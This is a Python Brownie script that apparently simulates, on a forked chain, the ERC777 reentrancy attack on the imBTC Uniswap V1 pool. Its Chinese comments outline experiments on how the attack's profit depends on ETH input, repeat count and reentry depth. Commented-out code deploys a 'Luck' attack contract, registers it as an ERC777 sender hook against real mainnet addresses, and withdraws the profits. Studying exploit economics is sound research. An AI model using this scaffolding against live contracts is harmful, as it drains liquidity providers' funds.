import json
from brownie import ETH_ADDRESS, accounts, interface, Luck, web3, chain
from matplotlib import use
from rich import print as rp

# hacker = accounts.at('0x60f3FdB85B2F7faaa888CA7AfC382c57F6415A81', force=True)
uni_factory = '0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95'
uniswap_v1 = interface.uniswap_exchange(
    '0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187')
imBTC = interface.imbtc('0x3212b29E33587A00FB1C83346f5dBFA69A458923')
erc1820_registey = interface.ERC1820Registry(
    '0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24')


def main():
    # setInterfaceImplementer
    # luck = Luck.deploy({
    #     'from': hacker
    # })
    # interface_hash_send = erc1820_registey.interfaceHash('ERC777TokensSender')
    # erc1820_registey.setInterfaceImplementer(luck, interface_hash_send, luck)

    user = accounts[0]

    # 测试1：获利与投入ETH的数量以及amout rate的关系
    profits = []
    for i in range(1, 20, 2):
        profits.append(simulate(i))
    with open('./profits.json', 'w') as f:
        json.dump(profits, f)

    # 测试2： 获利与攻击次数关系
    # 2-1：每次都使用100ETH攻击
    # profits = []
    # luck = Luck.deploy(2, {
    #     'from': user,
    # })
    # profits = simulate2(user, luck, times=200, eth_amount=100)
    # with open('./profits_times.json', 'w') as f:
    #     json.dump(profits, f)

    # 2-2: 最初使用100ETH攻击，之后每次使用全部ETH（包括之前的获利所得）
    # luck = Luck.deploy(2, {
    #     'from': user,
    #     'value': web3.toWei(100, 'ether')
    # })
    # profits = simulate2(user, luck, times=50, eth_amount=0)
    # with open('./profits_times_acc.json', 'w') as f:
    #     json.dump(profits, f)

    # 测试3：获利与重入次数的关系
    # profits = []
    # for i in range(2, 40):
    #     try:
    #         luck = Luck.deploy(i, {
    #             'from': user,
    #         })
    #         old_balance = user.balance()
    #         luck.good_luck({
    #             'from': user,
    #             'value': web3.toWei(100, 'ether')
    #         })
    #         luck.withdraw({
    #             'from': user
    #         })
    #         profits.append((user.balance() - old_balance)/1e18)
    #         chain.reset()
    #     except Exception as e:
    #         continue
    # with open('./profits_re_times.json', 'w') as f:
    #     json.dump(profits, f)


def simulate2(user, luck, times=1, eth_amount=10):
    # 模拟随着攻击次数的变化，获利情况
    profits = []
    for i in range(times):
        old_user_balance = user.balance()
        if eth_amount == 0:
            old_balance = luck.balance()
            luck.good_luck({
                'from': user
            })
            profits.append(luck.balance() - old_balance)
        else:
            luck.good_luck({
                'from': user,
                'value': web3.toWei(eth_amount, 'ether')
            })
            luck.withdraw({
                'from': user
            })
            profits.append(user.balance() - old_user_balance)
    return profits


def simulate(eth_amount=1):
    # Normal:
    user = accounts[0]
    profits = []
    for i in range(1, 20):
        imBTC.approve(uniswap_v1, (1 << 256)-1, {
            'from': user
        })
        origin_reserve_eth = uniswap_v1.balance()
        origin_reserve_imBTC = imBTC.balanceOf(uniswap_v1)
        origin_user_eth = user.balance()
        rp(f'[bold red]before[/]: reserve(uniswap) = ETH {origin_reserve_eth} : imBTC {origin_reserve_imBTC}')
        rp(f'[bold red]beofre[/]: balance(user): ETH={origin_user_eth}; imBTC={imBTC.balanceOf(user)}')

        rp(f'[bold green]-------------------------- swap {eth_amount} ether to imBTC in uniswap -----------------------[/]')
        old_user_imBTC = imBTC.balanceOf(user)
        uniswap_v1.ethToTokenSwapInput(
            int(uniswap_v1.getEthToTokenInputPrice(
                web3.toWei(1, 'ether')) * 0.99),
            chain.time() + 120, {
                'from': user,
                'value': web3.toWei(eth_amount, 'ether')
            })
        imBTC_obtain = imBTC.balanceOf(user) - old_user_imBTC
        rp(f'> [bold red]tmp[/]: {eth_amount} ether can obtain {imBTC_obtain} imBTC')
        rp(f'> [bold red]tmp[/]: reserve(uniswap) = ETH {uniswap_v1.balance()} : imBTC {imBTC.balanceOf(uniswap_v1)}')

        rp('[bold green]-------------------------- swap 2:  1/2 imBTC to ether in uniswap -----------------------[/]')

        eth_balance_before_first = user.balance()
        amount0 = imBTC_obtain * i / 20
        uniswap_v1.tokenToEthSwapInput(
            amount0,
            int(uniswap_v1.getTokenToEthInputPrice(
                amount0) * 0.99),
            chain.time() + 120, {
                'from': user
            })
        eth_balance_after_first = user.balance()
        first_eth_obtain = eth_balance_after_first - eth_balance_before_first

        rp(f'[bold red]first[/]: {amount0} imBTC can obtain {first_eth_obtain} ETH')
        rp(f'[bold red]first[/]: reserve(uniswap) = ETH {uniswap_v1.balance()} : imBTC {imBTC.balanceOf(uniswap_v1)}')
        rp(f'[bold red]first[/]: balance(user): ETH={user.balance()}; imBTC={imBTC.balanceOf(user)}')

        # rp('[bold green]-------------------------- swap 3:  1/2 imBTC to ether in uniswap -----------------------[/]')
        # uniswap_v1.tokenToEthSwapInput(
        #     imBTC_obtain * (1 - i / 10),
        #     int(uniswap_v1.getTokenToEthInputPrice(
        #         imBTC_obtain * i / 10) * 0.99),
        #     chain.time() + 120, {
        #         'from': user
        #     })

        # eth_obtain = user.balance() - old_user_eth
        # rp(f'[bold red]second[/]: {imBTC_obtain * i / 20} imBTC can obtain {eth_obtain} ETH')
        # rp(f'[bold red]second[/]: reserve(uniswap) = ETH {uniswap_v1.balance()} : imBTC {imBTC.balanceOf(uniswap_v1)}')
        # rp(f'[bold red]second[/]: balance(user): ETH={user.balance()}; imBTC={imBTC.balanceOf(user)}')

        chain.undo()
        rp('[bold green]-------------------------- swap 3 (MOCK):  1/2 imBTC to ether in uniswap -----------------------[/]')

        eth_balance_before_secod = user.balance()
        amount1 = imBTC_obtain - amount0
        uniswap_v1.tokenToEthSwapInput(
            amount1,
            int(uniswap_v1.getTokenToEthInputPrice(
                amount1) * 0.99),
            chain.time() + 120, {
                'from': user
            })
        eth_balance_after_second = user.balance()
        second_eth_obtain = eth_balance_after_second - eth_balance_before_secod

        rp(f'[bold red]second[/]: {amount1} imBTC can obtain {second_eth_obtain} ETH')
        rp(f'[bold red]second[/]: reserve(uniswap) = ETH {uniswap_v1.balance()} : imBTC {imBTC.balanceOf(uniswap_v1)}')
        rp(f'[bold red]second[/]: balance(user): ETH={user.balance()}; imBTC={imBTC.balanceOf(user)}')

        profits.append(eth_balance_after_first +
                       second_eth_obtain - origin_user_eth)
        chain.reset()

    print('profits: ', profits)
    return profits
